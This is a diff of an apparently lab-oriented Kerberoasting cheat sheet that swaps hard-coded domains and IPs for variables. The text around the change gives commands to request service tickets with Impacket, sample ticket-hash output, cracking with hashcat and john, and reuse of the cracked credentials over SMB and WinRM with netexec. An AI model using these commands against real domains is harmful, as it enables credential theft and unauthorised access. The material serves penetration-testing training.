@@ -16,7 +16,7 @@
 ### Impacket `GetUserSPNs.py`
 
 ```bash
-python3 GetUserSPNs.py example.com/web_svc:Diamond1 -dc-ip 10.10.10.10
+python3 GetUserSPNs.py $DOMAIN/web_svc:Diamond1 -dc-ip $DC_IP
 ```
 
 Output:
@@ -24,7 +24,7 @@ Output:
 ```
 ServicePrincipalName    Name        PasswordLastSet     LastLogon
 ----------------------  ----------  ------------------- ------------
-MSSQLSvc/sql01.htb.local:1433  svc_sql      2023-01-10 14:12:00   ...
+MSSQLSvc/sql01.$DOMAIN:1433  svc_sql      2023-01-10 14:12:00   ...
 
 $krb5tgs$23$*svc_sql@HTB.EXAMPLE:...
 ```
@@ -32,7 +32,7 @@ $krb5tgs$23$*svc_sql@HTB.EXAMPLE:...
 Request the ticket in hashcat format:
 
 ```bash
-python3 GetUserSPNs.py example.com/web_svc:Password1 -dc-ip 10.10.10.10 -request
+python3 GetUserSPNs.py $DOMAIN/web_svc:Password1 -dc-ip $DC_IP -request
 ```
 
 > Use `hashcat -m 13100` for this hash type.
@@ -80,10 +80,10 @@ john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs hashes.kerbero
 ## Post-Crack: Reuse Credentials
 
 ```bash
-nxc smb 10.10.10.10 -u svc_sql -p 'Summer2023!' -d example.com --shares
+nxc smb $IP -u svc_sql -p 'Summer2023!' -d $DOMAIN --shares
 ```
 
 ```bash
-nxc winrm 10.10.10.10 -u svc_sql -p 'Summer2023!' -d example.com --exec "whoami"
+nxc winrm $IP -u svc_sql -p 'Summer2023!' -d $DOMAIN --exec "whoami"
 ```
 
